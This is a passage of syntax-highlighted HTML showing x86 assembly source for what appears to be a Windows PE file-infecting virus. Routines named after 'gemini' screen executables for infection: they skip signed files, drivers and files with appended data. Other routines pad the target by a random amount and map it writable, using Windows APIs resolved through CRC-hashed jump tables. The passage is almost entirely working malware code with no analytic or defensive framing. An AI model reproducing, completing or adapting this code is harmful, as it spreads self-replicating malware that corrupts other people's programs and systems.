        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">is_pehdr</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">inftest_ret</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_MACHINE_I386</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">inftest_ret</span><span class="sc0">                     </span><span class="sc1">;only Intel 386+</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc0">                        </span><span class="sc1">;move high 16 bits into low 16 bits and multiply by 8</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;complete multiply by 28h (size pesect)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pehdr.pecoff.peflags</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pehdr.pecoff.petimedate</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;IMAGE_FILE_BYTES_REVERSED_* bits are rarely set correctly, so do not test them</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">IMAGE_FILE_SYSTEM</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_UP_SYSTEM_ONLY</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">inftest_ret</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pehdr.peentrypoint</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pehdr.pecoff.petimedate</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;if file is a .dll, then we require an entry point function</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_DLL</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">test_system</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">inftest_ret</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;32-bit executable file...</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">test_system</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_EXECUTABLE_IMAGE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_32BIT_MACHINE</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_EXECUTABLE_IMAGE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_32BIT_MACHINE</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">inftest_ret</span><span class="sc0">                     </span><span class="sc1">;cannot use xor+jpo because 0 is also jpe</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;the COFF magic value is not checked because Windows ignores it anyway</span><span class="sc0">
</span><span class="sc1">;IMAGE_FILE_MACHINE_IA64 machine type is the only reliable way to detect PE32+</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pehdr.pesubsys</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pehdr.pecodebase</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_SUBSYSTEM_WINDOWS_CUI</span><span class="sc0">
        </span><span class="sc6">jnbe</span><span class="sc0">    </span><span class="sc5">inftest_ret</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_SUBSYSTEM_WINDOWS_GUI</span><span class="sc0"> </span><span class="sc1">;al not ax, because ah is known now to be 0</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">inftest_ret</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1eh</span><span class="sc0">                        </span><span class="sc1">;test eax, IMAGE_DLLCHARACTERISTICS_WDM_DRIVER shl 10h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">inftest_ret</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;avoid files which seem to contain attribute certificates</span><span class="sc0">
</span><span class="sc1">;because one of those certificates might be a digital signature</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pehdr.pesecurity.dirrva</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pehdr.pecodebase</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">inftest_ret</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;cannot use the NumberOfRvaAndSizes field to calculate the Optional Header size</span><span class="sc0">
</span><span class="sc1">;the Optional Header can be larger than the offset of the last directory</span><span class="sc0">
</span><span class="sc1">;remember: even if you have not seen it does not mean that it does not happen :)</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pehdr.pecoff.peopthdrsize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pehdr.pecodebase</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pehdr.pecodebase</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pehdr.pemagic</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">pesect</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pesect.sectrawsize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">findlist.finddata.dwFileSizeLow</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">inftest_ret</span><span class="sc0">                     </span><span class="sc1">;file contains appended data</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mapsehstk.mapsehinfret</span><span class="sc4">]</span><span class="sc0">
                                                </span><span class="sc1">;skip call mask</span><span class="sc0">

</span><span class="sc5">inftest_ret</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;increase file size by random value (between RANDPADMIN and RANDPADMAX bytes)</span><span class="sc0">
</span><span class="sc1">;I use GetTickCount() instead of RDTSC because RDTSC can be made privileged</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">open_append</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cGetTickCount</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RANDPADMAX</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">small</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gemini_codeend</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gemini_exe</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RANDPADMIN</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;create file map, and map view if successful</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">map_view</span><span class="sc0">        </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;eax = extra bytes to map, ebx = file handle, esi -&gt; findlist, ebp -&gt; platform APIs</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">findlist.finddata.dwFileSizeLow</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;MapViewOfFile</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;MapViewOfFile</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;MapViewOfFile</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_MAP_WRITE</span><span class="sc0">                  </span><span class="sc1">;Windows 9x/Me does not support FILE_MAP_ALL_ACCESS</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kCreateFileMappingA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.kWaitForSingleObject</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;ANSI map is allowed because of no name</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_krnapi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kMapViewOfFile</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.kWaitForSingleObject</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_krnapi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;should succeed even if file cannot be opened</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">unmap_seh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sehstruc.sehprevseh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">                                   </span><span class="sc1">;SEH destroys all registers</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kUnmapViewOfFile</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.kWaitForSingleObject</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_krnapi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cCloseHandle</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">unmap_seh</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">cdq</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mapsehstk.mapsehsehret</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">unmap_seh</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">map_view</span><span class="sc0">        </span><span class="sc9">endp</span><span class="sc0">                            </span><span class="sc1">;eax = map handle, ecx = new file size, edi = map view</span><span class="sc0">
</span><span class="sc5">open_append</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;determine platform and dynamically select function types (ANSI or Unicode)</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">get_krnapis</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;place near to jump table for smaller code</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cGetVersion</span><span class="sc0">

</span><span class="sc5">krnapi_delta</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;no stack change in ring 3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">store_krnapi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">krnapi_delta</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">get_krnapis</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;indexed API jump table</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">cWaitForSingleObject</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">store_krnapi</span><span class="sc0">
</span><span class="sc5">cWaitForSingleObject</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">cSleep</span><span class="sc0">                  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kSleep</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.kWaitForSingleObject</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">call_krncrc</span><span class="sc0">
</span><span class="sc5">cSleep</span><span class="sc0">                  </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">cSetCurrentDirectoryA</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kSetCurrentDirectoryA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.kWaitForSingleObject</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">call_krncrc</span><span class="sc0">
</span><span class="sc5">cSetCurrentDirectoryA</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">cOpenEventA</span><span class="sc0">             </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kOpenEventA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.kWaitForSingleObject</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">call_krncrc</span><span class="sc0">
</span><span class="sc5">cOpenEventA</span><span class="sc0">             </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">cLoadLibraryA</span><span class="sc0">           </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kLoadLibraryA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.kWaitForSingleObject</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">call_krncrc</span><span class="sc0">
</span><span class="sc5">cLoadLibraryA</span><span class="sc0">           </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">cGlobalFree</span><span class="sc0">             </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kGlobalFree</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.kWaitForSingleObject</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">call_krncrc</span><span class="sc0">
</span><span class="sc5">cGlobalFree</span><span class="sc0">             </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">cGlobalAlloc</span><span class="sc0">            </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kGlobalAlloc</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.kWaitForSingleObject</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">call_krncrc</span><span class="sc0">
</span><span class="sc5">cGlobalAlloc</span><span class="sc0">            </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">cGetVersion</span><span class="sc0">             </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kGetVersion</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.kWaitForSingleObject</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">call_krncrc</span><span class="sc0">
</span><span class="sc5">cGetVersion</span><span class="sc0">             </span><span class="sc9">endp</span><span class="sc0">

